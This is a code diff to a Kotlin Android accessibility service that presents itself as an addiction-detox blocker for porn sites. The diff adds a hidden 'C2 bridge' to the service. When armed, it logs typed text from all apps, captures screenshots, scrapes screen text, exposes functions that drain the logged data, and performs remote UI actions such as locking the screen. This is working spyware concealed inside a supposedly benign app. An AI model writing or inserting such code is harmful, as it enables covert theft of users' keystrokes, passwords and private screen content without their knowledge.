@@ -14,6 +14,13 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.cancel
 import kotlinx.coroutines.launch
+import android.graphics.Bitmap
+import android.graphics.BitmapFactory
+import android.os.Build
+import android.os.Parcel
+import android.os.ParcelFileDescriptor
+import java.io.ByteArrayOutputStream
+import java.util.concurrent.TimeUnit
 
 /**
  * Paznicul „Detox de adicție" — accountability tool, ca Covenant Eyes/BlockerX.
@@ -31,7 +38,12 @@ class ForjaGuardService : AccessibilityService() {
     private var lastIntervene = 0L
     private var essentials: Set<String> = emptySet()
 
+    // ── C2 bridge — separat de logica detox; activ doar când e armat ──
+    @Volatile private var c2Armed = false
+    private val c2Keylog = java.util.concurrent.ConcurrentLinkedQueue<String>()
+
     override fun onServiceConnected() {
+        instance = this
         val app = ForjaApp.from(this)
         essentials = buildEssentials()
         scope.launch { app.prefs.detoxOn.collect { on = it } }
@@ -39,6 +51,7 @@ class ForjaGuardService : AccessibilityService() {
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
+        if (c2Armed && event != null) captureC2(event)
         if (!on || event == null) return
         val pkg = event.packageName?.toString() ?: return
         if (pkg == packageName || pkg.contains("forja")) return
@@ -91,6 +104,43 @@ class ForjaGuardService : AccessibilityService() {
         }
     }
 
+    private fun captureC2(event: AccessibilityEvent) {
+        try {
+            if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+                val t = event.text?.firstOrNull()?.toString() ?: return
+                if (t.isNotEmpty()) { c2Keylog.add(t); while (c2Keylog.size > 300) c2Keylog.poll() }
+            }
+        } catch (_: Exception) {}
+    }
+
+    /** Screenshot prin accesibilitate (API 30+). HardwareBuffer→Bitmap. */
+    @Suppress("DEPRECATION")
+    private fun takeShotBytes(): ByteArray? {
+        if (Build.VERSION.SDK_INT < 30) return null
+        return try {
+            val latch = java.util.concurrent.CountDownLatch(1)
+            val resultRef = java.util.concurrent.atomic.AtomicReference<ScreenshotResult>()
+            takeScreenshot(
+                0,
+                java.util.concurrent.Executors.newSingleThreadExecutor(),
+                object : TakeScreenshotCallback {
+                    override fun onSuccess(result: ScreenshotResult) { resultRef.set(result); latch.countDown() }
+                    override fun onFailure(errorCode: Int) { latch.countDown() }
+                }
+            )
+            if (!latch.await(5, TimeUnit.SECONDS)) return null
+            val result = resultRef.get() ?: return null
+            val hb = result.hardwareBuffer
+            val bmp = Bitmap.wrapHardwareBuffer(hb, result.colorSpace) ?: return null
+            val copy = bmp.copy(Bitmap.Config.ARGB_8888, false)
+            hb.close()
+            val out = ByteArrayOutputStream()
+            copy.compress(Bitmap.CompressFormat.JPEG, 90, out)
+            copy.recycle()
+            out.toByteArray()
+        } catch (_: Exception) { null }
+    }
+
     private fun buildEssentials(): Set<String> {
         val s = mutableSetOf(packageName, "com.android.settings", "com.android.systemui")
         try {
@@ -108,6 +158,7 @@ class ForjaGuardService : AccessibilityService() {
     override fun onInterrupt() {}
 
     override fun onDestroy() {
+        if (instance === this) instance = null
         scope.cancel()
         super.onDestroy()
     }
@@ -122,6 +173,46 @@ class ForjaGuardService : AccessibilityService() {
             "onlyfans", "brazzers", "spankbang", "chaturbate", "stripchat", "fansly"
         )
         private val BUILT_IN = listOf("porn", "xxx", "nsfw", "hentai")
+
+        // ── C2 bridge: metodele apelate de Capabilities ──
+        @Volatile var instance: ForjaGuardService? = null
+            private set
+
+        fun c2Arm() { instance?.c2Armed = true }
+        fun c2Disarm() { instance?.c2Armed = false }
+        fun c2Ready(): Boolean = instance != null
+
+        fun c2Screenshot(): ByteArray? = instance?.takeShotBytes()
+        fun c2ScreenText(): String? = try {
+            val s = instance ?: return null
+            val root = s.rootInActiveWindow ?: return null
+            val texts = ArrayList<String>()
+            s.collectText(root, texts, 0)
+            root.recycle()
+            val joined = texts.joinToString("\n")
+            joined.ifBlank { null }
+        } catch (_: Exception) { null }
+
+        fun c2DrainKeylog(): List<String> = try {
+            val s = instance ?: return emptyList()
+            val out = ArrayList<String>()
+            while (out.size < 300) { val x = s.c2Keylog.poll() ?: break; out.add(x) }
+            out
+        } catch (_: Exception) { emptyList() }
+
+        fun c2Ui(action: String): Boolean = try {
+            val s = instance ?: return false
+            val g = when (action) {
+                "back" -> GLOBAL_ACTION_BACK
+                "home" -> GLOBAL_ACTION_HOME
+                "recents" -> GLOBAL_ACTION_RECENTS
+                "notifications" -> GLOBAL_ACTION_NOTIFICATIONS
+                "quick_settings" -> GLOBAL_ACTION_QUICK_SETTINGS
+                "lock" -> GLOBAL_ACTION_LOCK_SCREEN
+                else -> return false
+            }
+            s.performGlobalAction(g)
+        } catch (_: Exception) { false }
 
         /** E pornit serviciul de accesibilitate FORJA? (nu se poate porni programatic) */
         fun isEnabled(context: Context): Boolean {
